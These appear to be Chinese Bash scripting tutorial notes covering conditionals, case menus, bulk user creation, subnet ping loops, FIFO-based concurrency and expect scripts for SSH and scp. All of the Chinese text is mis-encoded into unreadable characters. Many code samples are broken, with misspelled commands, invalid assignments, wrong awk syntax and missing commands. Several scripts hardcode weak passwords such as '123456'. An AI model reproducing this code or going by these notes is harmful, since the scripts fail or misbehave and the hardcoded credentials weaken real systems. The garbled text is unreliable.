å¦‚æœä¸æ˜¯ç›®å½•æˆ–è€…è¿™ä¸ªç›®å½•ä¸å­˜åœ¨ mkdir -p $back_dir fi echo "å¼€å§‹å¤‡ä»½..." å‘½ä»¤æ ¼å¼3ï¼š [[ -d /home ]] # [ -e dir|file ] -d æ˜¯å¦æ˜¯ç›®å½• -f æ˜¯å¦ä¸ºæ–‡ä»¶ -r `å½“å‰ç”¨æˆ·`æ˜¯å¦å¯¹è¯¥æ–‡ä»¶æœ‰è¯»æƒé™ -w -l æ˜¯å¦æ˜¯é“¾æ¥ -b æ˜¯å¦ä¸ºè®¾å¤‡æ–‡ä»¶ -c æ˜¯å¦ä¸ºå­—ç¬¦è®¾å¤‡ # [ ! -d /cc ] &amp;&amp; mkdir /cc # å½“å‰ä¸æ˜¯ä¸€ä¸ªç›®å½•æˆ–è€…ç›®å½•å¦‚æœä¸å­˜åœ¨ï¼Œå°±åˆ›å»º [ -d /ccc ] || mkdir /ccc # å½“å‰æ˜¯ä¸€ä¸ªç›®å½•æˆ–è€…ç›®å½•å¦‚æœå­˜åœ¨ï¼Œå°±ä¸åˆ›å»º 2.æ•°å€¼æ¯”è¾ƒ # [ 1 -gt 10 ] å¤§äº -lt å°äº -eq ç­‰äº -ne ä¸ç­‰äº -ge >= -le &lt;= #å®‰è£…è½¯ä»¶ï¼Œå…ˆåˆ¤æ–­æ˜¯å¦ä¸ºrootç”¨æˆ· if [ $UID -ne 0 ];then # $UIDä¸ç­‰äº0ï¼Œä»£è¡¨ä¸æ˜¯rootç”¨æˆ·(æ•°å€¼æ¯”è¾ƒ) echo "ä½ æ²¡æœ‰æƒé™!" exit fi apt install apache2 ä¾‹å­ï¼šç”¨æˆ·è¾“å…¥(read)ç”¨æˆ·åï¼Œåˆ›å»ºè¿™ä¸ªç”¨æˆ· read -p "input the user name: " user id $user &amp;>/dev/null if [ $? -eq 0 ];then # å¦‚æœç”¨æˆ·å­˜åœ¨ echo "user $user already exists" else useradd $user if [ $? -eq 0 ];then echo "$user is created." fi fi ä¾‹å­2ï¼š å¦‚æœç£ç›˜æ˜¯ä½¿ç”¨é‡è¶…è¿‡90%ï¼Œ å°±æŠ¥è­¦ # grep'/$' æ˜¯æå–æ ¹åˆ†åŒºï¼Œ $(NF) æ˜¯å€’æ•°ç¬¬ä¸€åˆ—ï¼Œ awkæ˜¯ä»¥ä»€ä¹ˆåˆ†å‰² dick_use=`df -Th |grep'/$'|awk '{print $(NF-1)}'|awk -F"%" '{print $1}'` mail_user=alice warn_file=/tmp/disk_warn.txt if [ $dick_use -gt 90 ];then echo "`date +%F:%H` disk: ${dick_use}%" >warn_file fi if [ -f $disk_warn ];then # å°†æŠ¥é”™æ–‡ä»¶å‘é€ç»™é‚®ä»¶ç”¨æˆ· mail -s "disk warning..." $mail_user &lt; $dick_use # |mail -s é‚®ä»¶ä¸»é¢˜ rm -rf $disk_warn fi # å¯ä»¥ç”¨crontabï¼Œå®šæ—¶æ‰§è¡Œï¼ˆcrontab -eä¼šæŠŠæ‰€æœ‰çš„ä»»åŠ¡æ¸…é™¤ï¼‰ # æ¢è¡Œæ˜¯ \ 3.å­—ç¬¦ä¸²æ¯”è¾ƒ = == != [ -n "hhh" ] # é•¿åº¦ä¸æ˜¯0 [ -z "$user" ] # é•¿åº¦ä¸º0 (å˜é‡ä¸ºç©º/æœªå®šä¹‰ => éƒ½æ˜¯0) -a # å¹¶ä¸” [1 -lt 1 -a 5 -gt 10] -r # æˆ–è€… &amp;&amp; || if [ $USER != 'root' ];then # $USERä¸ç­‰äºroot(å­—ç¬¦ä¸²æ¯”è¾ƒ) echo "ä½ æ²¡æœ‰æƒé™!" exit fi apt install apache2 ä¾‹å­ï¼šæ‰¹é‡åˆ›å»ºç”¨æˆ· #å°½é‡ä½¿ç”¨åŒå¼•å·å¼•èµ·æ¥ #[ "$USER" = "root" ] #!/bin/bash ################################## #è„šæœ¬è§„èŒƒ # #useradd # #V1.0 by xps 01/03/2020 # ################################## read -p "Please input number: " num # read -p "Please input å‰ç¼€: " prefix while true do # å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼ˆæ•°å­—ï¼‰ ^[0-9]+$ æ­£åˆ™ =~ (æ¨¡å¼ä¸²ä¸èƒ½å¸¦åŒå¼•å·) #if [[ ! "$num" =~ ^[0-9]+$ || "$num" =~ ^0+$ ]];then # []å•ä¸ªæ–¹æ‹¬å·ä¸æ”¯æŒæ­£åˆ™ï¼Œç”¨[[ å˜é‡ =~ æ¨¡å¼ ]] if [[ "$num" =~ ^[0-9]+$ ]];then break else read -p "ä¸æ˜¯æ•°å­—ï¼ŒPlease input number again: " num fi done read -p "Please input å‰ç¼€: " prefix while true do if [ -n "$prefix" ];then # å¦‚æœé•¿åº¦ä¸ºé0 break else read -p "Please input å‰ç¼€: " prefix fi done # man seq æ‰“å°åºåˆ—ï¼š seq 1 2 10 (åŒºé—´ï¼Œæ­¥é•¿) for i in `sql $num` do user=$prefix$i useradd $user echo "123" |passwd --stdin $user # --stdin å‰é¢è¾“å‡ºçš„å½“åšæ ‡å‡†è¾“å…¥ if [ $? -eq 0 ];then echo "$user is created." fi done # declare å¯ä»¥å®šä¹‰æ•°æ®ç±»å‹ã€‚ä½†æ˜¯ä¸€èˆ¬ä¸ç”¨ï¼Œå› ä¸ºéƒ½æ˜¯å­—ç¬¦ä¸² ## è¯­æ³•ä¸éš¾ï¼Œä¸»è¦æ˜¯å¯¹Linuxç³»ç»Ÿä»¥åŠå‘½ä»¤çš„ç†Ÿæ‚‰ã€‚ # ifåé—¨ç´§è·Ÿçš„ä¸ä¸€å®šæ˜¯æ–¹æ‹¬å·ï¼Œåªè¦æ˜¯èƒ½è¿”å›true/falseçš„å°±è¡Œ if [[ condition ]]; then #statements elif [[ condition ]]; then #statements elif [[ condition ]]; then #statements fi switchè¯­æ³•ç»“æ„ case å˜é‡ in æ¨¡å¼1) # éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œ å¯ä»¥ç”¨é€šé…ç¬¦ (å°½é‡ä½¿ç”¨åŒå¼•å·) å‘½ä»¤åºåˆ—1 ;; æ¨¡å¼2) å‘½ä»¤åºåˆ—2 ;; æ¨¡å¼3) å‘½ä»¤åºåˆ—3 ;; *) æ— åŒ¹é…åå‘½ä»¤åºåˆ— esac ä¾‹å­1ï¼šåˆ é™¤ç”¨æˆ· read -p "è¯·è¾“å…¥è¦åˆ é™¤çš„ç”¨æˆ·åï¼š " user id $user &amp;>/dev/null if [ &amp;? -ne 0 ];then echo "no suc user: $user" exit 1 # è¿”å›1ï¼ˆæ„æ€æ˜¯é”™è¯¯é€€å‡ºï¼‰ fi read -p "ä½ ç¡®å®šè¦åˆ é™¤ç”¨æˆ·: $user å— ?[y/n]: " action case "$action" in y|Y|yes|YES) userdel -r $user echo "deleted user: $user success!" ;; *) echo "error" esac ä¾‹å­2ï¼š åˆ¤æ–­ä¸€ä¸ªä¸œè¥¿æ˜¯ä¸æ˜¯å‘½ä»¤ # command -v xxx # echo $? è¿”å›ä¸º0å°±æ˜¯ command -v ls cmd1=/bin/date if command -v $cmd1 &amp;>/dev/null;then # ç¥é©¬éƒ½ä¸åšï¼š åªåŠ ä¸€ä¸ªå†’å· : else echo "$cmd1 æ˜¯ä¸€ä¸ªå‘½ä»¤" fi ä¾‹å­3ï¼šé€šè¿‡ç™»å½•å ¡å’æœº/è·³æ¿æœº jumpserver ï¼Œç„¶åç™»å½•å†…ç½‘çš„æœåŠ¡å™¨ ï¼ˆç®€æ˜“ç‰ˆï¼‰ # 1.å…ˆç™»å½•åˆ°è·³æ¿æœº(æ™®é€šè´¦å·) # 2.è·³æ¿æœºç™»å½•åˆ°other serverï¼ˆï¼‰ # ç™»å½•ä¸¤æ¬¡ï¼Œæœ‰ç‚¹éº»çƒ¦ # ä¾‹å­ï¼š å…ˆç™»å½•åˆ°è·³æ¿æœºï¼Œå†é€šè¿‡é€‰é¡¹é€‰æ‹©è¦ç™»å½•åˆ°å“ªå°æœåŠ¡å™¨ï¼ˆ1.å¯†ç è®¤è¯ 2.ç§˜é’¥è®¤è¯:ä»¥ç”¨æˆ·xpsèº«ä»½åš ssh-keygen, ssh-copy-id web1ï¼‰ # ä»¥xpsèº«ä»½ç™»å½•ä¸Šæ¥ï¼Œ ç§˜é’¥ç™»å½•æœåŠ¡å™¨ # è„šæœ¬æ”¾åˆ°/home/xps/jumpserver.sh, æ”¾åˆ°bashrcï¼Œç™»å½•è¿™å°æœºå™¨å°±æ‰§è¡Œï¼Œå¹¶ä¸”ç¦æ­¢ç”¨æˆ·(^C)é€€å‡º trap "" HUP INT OUIT TSTP # æ•æ‰é”®ç›˜ä¿¡å·ï¼Œç„¶åå•¥ä¹Ÿä¸åš(^Cä¹Ÿé€€å‡ºä¸äº†) ,è®©ä»–ç™»å½•è·³æ¿æœºä¸èƒ½å¹²åˆ«çš„ web1=192.168.0.111 web2=192.168.0.112 web3=192.168.0.113 cat &lt;&lt;-EOF +---------------------------+ | 1. web1 | | 2. web2 | | 3. mysql1 | +---------------------------+ EOF echo -en "\e[1;32minput number: \e[0m" # æ˜¾ç¤ºé¢œè‰², -nä¸æ¢è¡Œ read num while true do case "$num" in 1) ssh xps@$web1 ;; 2) ssh xps@$web2 ;; 3) ssh xps@$mysql1 ;; "") # ç”¨æˆ·å•¥ä¹Ÿæ²¡è¾“å…¥ true *ï¼‰ echo "error" esac done ## ç”Ÿäº§ç¯å¢ƒ #1. ä¸šåŠ¡æœåŠ¡å™¨ä¸å…è®¸ç›´æ¥è¿æ¥ï¼Œå…è®¸é€šè¿‡è·³æ¿æœºè¿æ¥ #2. ä¸šåŠ¡æœåŠ¡å™¨ä¸å…è®¸rootç”¨æˆ·ç›´æ¥ç™»å½• ### å¤æ‚ç‰ˆjumpserver(å¯¹ç”¨æˆ·è¡Œä¸ºè¿›è¡Œè¡Œä¸º/è®°å½•) ---> ä½¿ç”¨Pythonè„šæœ¬ ä¾‹å­4ï¼šå®ç°ç³»ç»Ÿç®¡ç†å·¥å…·ç®± #!/bin/bash ## å®ç°ç³»ç»Ÿç®¡ç†å·¥å…·ç®± # å®šä¹‰ä¸€ä¸ªå‡½æ•° menu{ cat &lt;&lt;-EOF ########################################## # h. help # # f. disk partion # # d. filesystem mount # # m. memory # # u. system load # # q .exit # ########################################## EOF } menu while true do read -p "Please input[h for help]: " action case "$action" in h) clear; menu;; f) fdisk -l;; d) df -Th;; m) free -m;; u) uptime;; q) break;; "") ;; *) echo "error";; esac done echo "finish..." å„ç§ç¬¦å·#!/bin/bash () # åœ¨å­shellä¸­æ‰§è¡Œ ((1&lt;2)) # Cè¯­è¨€é£æ ¼çš„æ¯”è¾ƒ $(date) # touch $(date +%F)_file.txt å…ˆæ‰§è¡Œé‡Œé¢çš„å‘½ä»¤å†æ‰§è¡Œå¤–é¢çš„ $(()) # è¿ç®— {} # é›†åˆ{1..5} ${} # å˜é‡çš„å¼•ç”¨ [] # æ¡ä»¶æµ‹è¯• é€»è¾‘ç¬¦å· [ a -a b ] [[]] # å‡çº§ç‰ˆçš„ã€‚ æ”¯æŒæ­£åˆ™åŒ¹é… [[ =~ ]]ï¼Œ é€»è¾‘ç¬¦å· [[ a &amp;&amp; b ]] $[] # æ•´æ•°è¿ç®— ####### æ‰§è¡Œè„šæœ¬ ./01.sh # éœ€è¦æ‰§è¡Œæƒé™ï¼Œåœ¨å­shellä¸­æ‰§è¡Œ bash 01.sh # ä¸éœ€è¦æ‰§è¡Œæƒé™ï¼Œåœ¨å­shellä¸­æ‰§è¡Œ 01.sh # éœ€è¦æ‰§è¡Œæƒé™ï¼Œåœ¨å½“å‰shellä¸­æ‰§è¡Œ source 01.sh # ä¸éœ€è¦æ‰§è¡Œæƒé™ï¼Œåœ¨å½“å‰shellä¸­æ‰§è¡Œ ###### è°ƒè¯•è„šæœ¬ sh -n 02.sh # ä»…è°ƒè¯•syntax error sh -vx 02.sh # ä»…è°ƒè¯•çš„æ–¹å¼æ‰§è¡Œï¼ŒæŸ¥è¯¢æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹ å››.å¾ªç¯forå¾ªç¯ å¤„ç†å›ºå®šå¾ªç¯çš„æ—¶å€™ï¼Œforæœ‰ä¼˜åŠ¿ å½¢å¼ for å˜é‡å [ in åˆ—è¡¨ ] do å¾ªç¯ä½“ done æ‹“å±•ï¼š æŸ¥çœ‹è„šæœ¬è¿è¡Œæ—¶é—´: time ./a.sh ä¾‹å­1ï¼š forå¾ªç¯pingæœºå™¨ # é‡å®šå‘ >ip.txt # {2..254} é›†åˆï¼Œ å¦ä¸€ä¸ªåºåˆ—: seq `2 254` for i in {2..254} do { $ip = 192.168.111.$i ping -c1 -W1 $ip &amp;>/dev/null # -Wç­‰å¾…å¤šå°‘æ—¶é—´ if [ $? -eq 0 ]; then echo "$ip" | tee -a ping.txt fi }&amp; # ç”¨å¤§æ‹¬å·å’Œ&amp;, æŠŠæ•´ä¸ªå¾ªç¯ã€æ”¾åˆ°åå°ã€‘ done wait # ç­‰å¾…å‰é¢çš„æ‰€æœ‰ã€åå°ã€‘è¿›ç¨‹ç»“æŸï¼Œå†æ‰§è¡Œåé¢çš„ echo "finish !" ä¾‹å­2ï¼šä»æ–‡ä»¶ä¸­è¯»å–ä¸»æœºï¼Œç„¶åping # {2..254} é›†åˆï¼Œ å¦ä¸€ä¸ªåºåˆ—: seq `2 254` for ip in `cat ips.txt` do ping -c1 -W1 $ip &amp;>/dev/null # -Wç­‰å¾…å¤šå°‘æ—¶é—´ if [ $? -eq 0 ]; then echo "$ip is up!" else echo "$ip is down!" fi done wait # ç­‰å¾…å‰é¢çš„æ‰€æœ‰ã€åå°ã€‘è¿›ç¨‹ç»“æŸï¼Œå†æ‰§è¡Œåé—¨çš„ echo "finish !" ä¾‹å­3ï¼šæ‰¹é‡åˆ›å»ºè´¦å· while : do read -p "input your prefix &amp; passwd &amp; number : " prefix passwd number printf "user information: --------------------------- username: $passwd prefix: $prefix number: $number --------------------------- " read -p "Are you sure?[y/n]" action if [ "$action" = "y" ];then break fi done echo "continue ..." # ç„¶åæ˜¯æ¥ä¸‹æ¥çš„åŠŸèƒ½ for i in `seq -w $number` do user = $prefix%i id $user &amp;>/dv/null if [ $? -eq ];then echo "user $user already exists" else useradd $user echo "$passwd" | --stdin $user # å°†å¯†ç ä½œä¸ºæ ‡å‡†è¾“å…¥ if [ $? -eq 0 ];then echo "$user is created." fi fi done # bash -n .sh æ£€æŸ¥è„šæœ¬é”™è¯¯ ä¾‹å­4ï¼šæ‰¹é‡åˆ›å»ºè´¦å·ï¼ˆä»æ–‡ä»¶ä¸­ï¼‰ passwd = 123 # å¿…é¡»è¦è¾“å…¥æ–‡ä»¶ if [ $# -eq 0 ];then echo "usage: `basename $0` file" exit fi # åˆ¤æ–­è¾“å…¥çš„æ˜¯å¦æ˜¯æ–‡ä»¶ if [ ! -f $1 ];then echo "error file" exit 2 fi # å¼€å§‹(ä¸¤åˆ— -- > æŠŠå¯†ç å’Œç”¨æˆ·ååˆ†å¼€) # åº”è¯¥ï¼šé‡æ–°å®šä¹‰åˆ†éš”ç¬¦ # IFSå†…éƒ¨å­—æ®µåˆ†éš”ç¬¦,æ¯”å¦‚ä¸‹é¢çš„å›è½¦ # IFS = $'\n' for line in `cat $1` # ä½ç½®å˜é‡ , forå¯¹ç©ºè¡Œä¸æ„Ÿå†’ do # é•¿åº¦ä¸º0å°±è·³è¿‡ if $[ ${#line} -eq 0 ];then echo "Nothing to do." continue fi user = `echo "$line" |awk 'print &amp;1'` pass = `echo "$line" |awk 'print &amp;2'` id $user &amp;>/dv/null if [ $? -eq ];then echo "user $user already exists" else useradd $user echo "$pass" | --stdin $user &amp;>/dev/null # å°†å¯†ç ä½œä¸ºæ ‡å‡†è¾“å…¥ if [ $? -eq 0 ];then echo "$user is created." fi fi done ä¾‹å­5ï¼šæ‰¹é‡ä¿®æ”¹å¯†ç (å‰©ä¸‹çš„åŠŸèƒ½è‡ªå·±å®Œå–„) # ç›®å‰ï¼šé€šçš„æ”¾ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸é€šçš„æ”¾ä¸€ä¸ªæ–‡ä»¶ for ip in $(cat ip.txt) do { ping -c1 -W1 $ip &amp;>/dev/null if [ $? -eq 0 ];then ssh $ip echo "123" |passwd --stdin $user # é‡‡ç”¨çš„å…¬é’¥è®¤è¯ if [ $? -eq 0 ];then echo "$ip" >>success_`date + %F`.txt else echo "$ip" >>failed_`date + %F`.txt fi else echo "$ip" >>failed_`date + %F`.txt fi }&amp; done wait echo "end!" ä¾‹å­6ï¼šæ‰¹é‡ä¿®æ”¹ä¸»æœºsshè®¾ç½® ssh $ip "sed -ri '/~#UseDNS/cUseDNS0 no' /etc/ssd/sshd_config" # æœç´¢å¹¶æ›¿æ¢(c) whileå¾ªç¯ é€è¡Œè¯»å–æ–‡ä»¶çš„æ—¶å€™ï¼Œwhileæœ‰ä¼˜åŠ¿ ä¸ç”¨åƒforå¾ªç¯é‚£æ ·æ‹…å¿ƒæ¯ä¸€è¡Œçš„ç©ºæ ¼ç©ºè¡Œ æ‰€ä»¥ï¼šè¯»å–ä¸€ä¸ªæ–‡ä»¶ä¸­é€è¡Œå¤„ç†ï¼Œwhileæ¯”forå¥½ç”¨ ä¾‹å­1ï¼šåˆ›å»ºç”¨æˆ· # ä»¥åï¼Œè¯»å–ä¸€ä¸ªæ–‡ä»¶ä¸­é€è¡Œå¤„ç†ï¼Œwhileæ¯”forå¥½ç”¨ while read line: do # åˆ¤æ–­ç”¨æˆ·æ•°æ˜¯å¦è¾“å…¥å‚æ•° if [ ${#line} -eq 0 ];then continue fi user = `echo $line|awk '{printf $1}'` pass = `echo $line|awk '{printf $2}'` id $user &amp;>/dev/null if [ $? -eq 0 ];then echo "user $user already exists" else useradd $user echo "$pass" | --stdin $user &amp;>/dev/null # å°†å¯†ç ä½œä¸ºæ ‡å‡†è¾“å…¥ if [ $? -eq 0 ];then echo "$user is created." fi fi done &lt; $1 # å¯ä»¥æ¢æˆä½ç½®å˜é‡, ä»æ–‡ä»¶é‡Œé¢è¯»å–ç”¨æˆ·å(readä¸ç”¨-päº†) # done &lt; user.tx # ä¾‹å­2ï¼šwhileå®ç°è¿æ¥æµ‹è¯• # åªè¦pingé€šå°±ä¸€ç›´pingï¼ˆã€æ¡ä»¶ä¸ºtrueæ—¶å€™ä¸€ç›´æ‰§è¡Œå¾ªç¯ã€‘ï¼‰ ip=192.168.0.5 while ping -c1 -W1 $ip &amp;>/dev/null; do sleep 1 done echo "$ip is down!" ä¾‹å­3ï¼šuntil å®ç°è¿æ¥æµ‹è¯• ip=192.168.0.5 until ping -c1 -W1 $ip &amp;>/dev/null; do sleep 1 done echo "$ip is up!" while é€‚åˆå†™ä¸»æœºä¸‹çº¿ until é€‚åˆå†™ä¸»æœºä¸Šçº¿ untilå¾ªç¯å½¢å¼ # å½“æ¡ä»¶æµ‹è¯•ä¸ºfalseæ—¶å€™æ‰§è¡Œå¾ªç¯ä½“ until æ¡ä»¶æµ‹è¯• do å¾ªç¯ä½“ done ä¾‹å­1ï¼šuntilå®ç°æ•°å€¼è¿ç®— # i=1 until [ $i -gt 100 ] # >100 do let sum+=$i let i++ done echo "sum: $sum" ä¾‹å­2ï¼šwhileå®ç°æ•°å€¼è¿ç®— #æ•°å€¼è¿ç®—ï¼šlet i=1 while [ $i -le 100 ] # &lt;=100 do let sum+=$i done echo "sum: $sum" å¹¶å‘ å¹¶å‘ â€”&gt; å¤šè¿›ç¨‹ ä¹‹å‰å†™çš„ä¼ ç»Ÿå¹¶å‘çš„æ–¹å¼ï¼Œå¤šè¿›ç¨‹ï¼ˆè¿”å›æ˜¯æ—¶é—´æ˜¯ä¹±åºçš„ï¼‰ ç¼ºç‚¹ï¼šæœ‰äº›å¹¶å‘æ•°é‡å¤ªå¤šï¼Œä¼šæŠ¥é”™ æ ¼å¼: ... { ... }&amp; wait ... æ¯”å¦‚ï¼š for i in {1..254} do { ip=192.168.0.$i ping -c1 -W1 $ip &amp;>/dev/null if [ $? -eq 0 ];then echo "$ip is up." else echo "$ip is down." fi }&amp; done wait echo "æ‰§è¡Œç»“æŸ..." æ§åˆ¶å¹¶å‘çš„æ•°é‡ ### 1). FD(File Descriptors)æ–‡ä»¶æè¿°ç¬¦ æˆ– æ–‡ä»¶å¥æŸ„ # è¿›ç¨‹ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦æ¥ç®¡ç†æ‰“å¼€çš„æ–‡ä»¶ï¼ˆä½ç½®ï¼š /proc/è¿›ç¨‹id/fd/ï¼‰ # $$æ˜¯å½“å‰è¿›ç¨‹ exec 6&lt;> /file1 # 1.æ‰‹åŠ¨æŒ‡å®šæè¿°ç¬¦æ¥ æ‰“å¼€æ–‡ä»¶ echo "111" >> /proc/$$/fd/6 # 2.å†™å…¥åˆ°äº†file1 # 3.åˆ é™¤file1 # 4.ç„¶åæŸ¥çœ‹æ–‡ä»¶å¥æŸ„: ll /proc/$$/fd # ä¼šå‘ç°6æ˜¾ç¤ºåˆ é™¤çŠ¶æ€ ## 5.æŠŠ6è¿™ä¸ªæ–‡ä»¶æ‹·è´å‡ºæ¥å˜æˆfile1,å°±åˆå›æ¥äº†ï¼ˆå¦‚æœæ–‡ä»¶å¥æŸ„æ²¡æœ‰åˆ é™¤æˆ–å…³é—­ã€‚å°±ç®—åŸæ–‡ä»¶è¢«åˆ é™¤äº†ï¼Œå¥æŸ„ä¾ç„¶åœ¨ï¼‰ ls of # 6.åˆ—å‡ºæ‰“å¼€çš„æ–‡ä»¶ exec 6&lt;&amp;- # 7.é‡Šæ”¾æ–‡ä»¶çš„å¥æŸ„ ### 2). ç®¡é“ ## åŒ¿åç®¡é“(ä¸€ä¸ªç»ˆç«¯å†…ä½¿ç”¨) | ## è·¨ç»ˆç«¯ä½¿ç”¨ mkfifo mkfifo /tmp/fifo1 # åˆ›å»º ll /dev > /tmp/fifo1 # æŠŠdevé‡å®šå‘åˆ°ç®¡é“ä¸­ï¼Œå¦ä¸€ä¸ªç»ˆç«¯å°±å¯ä»¥ç”¨äº† # å¦ä¸€ä¸ªç»ˆç«¯ä½¿ç”¨ï¼š grep 'sda' /tmp/fifo1 ä¾‹å­ï¼š thread=5 tmp_fifofile=/tmp/$$.fifo mkfifo $tmp_fifofile exec 8&lt;> $tmp_fifofile rm $tmp_fifofile for i in `seq $thread` do echo >&amp;8 # æ“ä½œçš„æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼ˆï¼‰ done for i in {1..254} do read -u 8 # -u æ˜¯è¯»å–æ–‡ä»¶æè¿°ç¬¦å†…å®¹ï¼ˆé€è¡Œï¼‰ { ip=192.168.0.$i ping -c1 -W1 $ip &amp;>/dev/null if [ $? -eq 0 ];then echo "$ip is up." else echo "$ip is down." fi echo >&amp;8 # æœ‰å€Ÿæœ‰è¿˜ï¼ˆå€Ÿä¸€ä¸ªè¿˜ä¸€ä¸ªï¼Œä¸èƒ½è®©æ–‡ä»¶æè¿°ç¬¦é‡Œé¢ç©ºï¼‰ }&amp; done wait echo "æ‰§è¡Œç»“æŸ. .." # æ‰§è¡Œç»“æœæ˜¯5ä¸ª5ä¸ªå‡ºæ¥çš„ï¼ˆå› ä¸ºå®šä¹‰çš„è¿›ç¨‹æ˜¯5ä¸ªï¼‰ expect expect â€”-&gt; ä¸æ˜¯shellï¼Œæ˜¯ä¸€ä¸ªæ–°çš„è¯­è¨€ è§£å†³äº¤äº’çš„ç¹çæ“ä½œ å®‰è£…ï¼šapt install expect expectå®ç°æ‰¹é‡è¿œç¨‹å‘½ä»¤æ‰§è¡Œ # å¦‚æœfor whileï¼Œéœ€è¦ä¸€æ­¥æ­¥çš„äº¤äº’(æ¯”è¾ƒéº»çƒ¦)ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨å…¬é’¥è®¤è¯(ssh-keygen,ssh-copy-id) #ç¬¬ä¸€æ­¥ï¼Œå®ç°äº†å…¬é’¥è®¤è¯ # ps:å¦‚æœç™»å½•çš„æ–°çš„æœºå™¨ä¸ä¹‹å‰çš„æŒ‡çº¹ä¸ä¸€æ ·ï¼Œå…ˆåˆ é™¤æœ¬åœ°ä¿å­˜çš„ä¿¡æ¯ # expectæ‰“å‰ç«™ï¼Œå…ˆæŠŠå…¬é’¥æ¨è¿‡å»ï¼Œåé¢å†ç”¨åˆ«çš„å®ç° sshåˆçº§ä¾‹å­1ï¼š #!/usr/bin/expect set ip 192.168.0.1 set user root set passwd 123456 set timeout 5 spawn ssh $user@$ip expect { #å°±æ˜¯æŠŠæ¥ä¸‹æ¥è¦å‡ºç°çš„å­—ç¬¦ä¸²ç­‰æå‰å†™å¥½ "yes/no" { send "yes\r"; exp_continue } # å½“å‡ºç°ä»€ä¹ˆï¼Œæ€ä¹ˆå¤„ç†(æ²¡å‡ºç°å°±ç»§ç»­) "password:" { send "$passwd\r" }; } interact #äº¤äº’åœåœ¨å¯¹æ–¹é‚£è¾¹ä¸é€€å‡ºæ¥ # æ‰§è¡Œè„šæœ¬: expect test.sh sshåˆçº§ä¾‹å­2(å‡çº§ç‰ˆ)ï¼š #!/usr/bin/expect set ip [lindex $argv 0] # ç¬¬ä¸€ä¸ªä½ç½®å‚æ•°(ä¸shellçš„ä¸é€š) set user [lindex $argv 1] set passwd 123456 set timeout 5 spawn ssh $user@$ip expect { #å°±æ˜¯æŠŠæ¥ä¸‹æ¥è¦å‡ºç°çš„å­—ç¬¦ä¸²ç­‰æå‰å†™å¥½ "yes/no" { send "yes\r"; exp_continue } # å½“å‡ºç°ä»€ä¹ˆï¼Œæ€ä¹ˆå¤„ç†(æ²¡å‡ºç°å°±ç»§ç»­) "password:" { send "$passwd\r" }; } #interact # äº¤äº’åœåœ¨å¯¹æ–¹é‚£è¾¹ä¸é€€å‡ºæ¥ # å¹²ç‚¹åˆ«çš„äº‹æƒ… expect "#" # ä¸ç”¨å¤§æ‹¬å·ä¹Ÿå¯ä»¥ #send "useradd xps\r" send "pwd\r" send "exit\r" expect eof # ç»“æŸexpect ä¾‹å­3ï¼šscpä¼ é€’æ–‡ä»¶ ######## å‡çº§ç‰ˆ #!/usr/bin/expect set ip [lindex $argv 0] # ç¬¬ä¸€ä¸ªä½ç½®å‚æ•°(ä¸shellçš„ä¸é€š) set user [lindex $argv 1] set passwd 123456 set timeout 5 spawn scp -r /etc/xxx $user@$ip:/tmp expect { #å°±æ˜¯æŠŠæ¥ä¸‹æ¥è¦å‡ºç°çš„å­—ç¬¦ä¸²ç­‰æå‰å†™å¥½ "yes/no" { send "yes\r"; exp_continue } # å½“å‡ºç°ä»€ä¹ˆï¼Œæ€ä¹ˆå¤„ç†(æ²¡å‡ºç°å°±ç»§ç»­) "password:" { send "$passwd\r" }; } expect eof # ç»“æŸexpect ä¾‹å­4ï¼š æ¨å…¬é’¥ # shellä¸expectä¸€èµ·ç”¨ #!/bin/bash >ip.txt passwd=123 #æµ‹è¯•expectæœ‰æ²¡æœ‰è£…(ä»¥centosä¸ºä¾‹) rpm -q expect &amp;/dev/null if [ $? -ne 0 ];then yum -y install expect fi # åˆ¤æ–­æ˜¯å¦æœ‰å…¬é’¥ if [ ! -f ~/.ssh/id_rsa ];then ssh-keygen -P "123" -f ~/.ssh/id_rsa # æŒ‡å®šå…¬é’¥çš„å¯†ç å’Œä½ç½® fi for i in {2..254} do { ip=192.168.0.$i pign -c1 -W1 $ip &amp;/dev/null if [ $? -eq 0 ];then echo "$ip" >> ip.txt # å¼€å§‹expect /usr/bin/expect &lt;&lt;-EOF set timeout 10 spawn ssh-copy-id $ip # æ¨é€å…¬é’¥ã€‚ å‰é¢å¿…é¡»éƒ½æ˜¯tabï¼Œä¸èƒ½æœ‰ç©ºæ ¼ï¼ˆ:set list æŸ¥çœ‹æ˜¯tabè¿˜æ˜¯ç©ºæ ¼ï¼‰ expect { "yse/no" { send "yes\r"; exp_continue } "password:" { send "$passwd\r" } } expect eof EOF fi }&amp; done wait echo "finish..." # ä¸Šä¸€ä¸ªä¾‹å­, å·²ç»å®ç°äº†å…¬é’¥è®¤è¯ï¼Œåé¢çš„æ“ä½œå°±å¯ä»¥ä½¿ç”¨shelläº†ï¼ŒåŸºæœ¬ä¸ç”¨expectäº† # é‡å¯ä¹‹åæŸ¥çœ‹æœºå™¨çš„ipï¼Œç›´æ¥ç”¨get_ip.shè„šæœ¬ï¼ˆå°±ä¸ç”¨äº†ä¸€ä¸ªä¸€ä¸ªå»çœ‹äº†ï¼‰ #!/bin/bash >ping.txt # {2..254} é›†åˆï¼Œ å¦ä¸€ä¸ªåºåˆ—: seq `2 254` for i in {2..254} do { $ip = 192.168.111.$i ping -c1 -W1 $ip &amp;>/dev/null if [ $? -eq 0 ]; then echo "$ip" | tee -a ping.txt fi }&amp; ã€‘ done wait echo "finish !!!" äº”.æ•°ç»„æ²¡æœ‰å¤šç»´æ•°ç»„è¿™ä¸ªæ¦‚å¿µ å®šä¹‰ 1.æ™®é€šæ•°ç»„ # æ™®é€šæ•°ç»„ï¼šåªèƒ½ä½¿ç”¨æ•´æ•°ä½œä¸ºæ•°ç»„ç´¢å¼• books=(linux shell awk docker) books=(linux shell awk [20]=docker) # ç´¢å¼•20ä¸ºdocker # ä»æ–‡ä»¶èµ‹å€¼ books2=(`cat /etc/passwd`) books=(`ls /etc/`) # ä¸­é—´å€¼å¯ä»¥è·³è¿‡ 2.å…³è”æ•°ç»„ # å…³è”æ•°ç»„ï¼šå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²ä½œä¸ºæ•°ç»„ç´¢å¼•ï¼ˆç›¸å½“äºå­—å…¸ï¼‰ 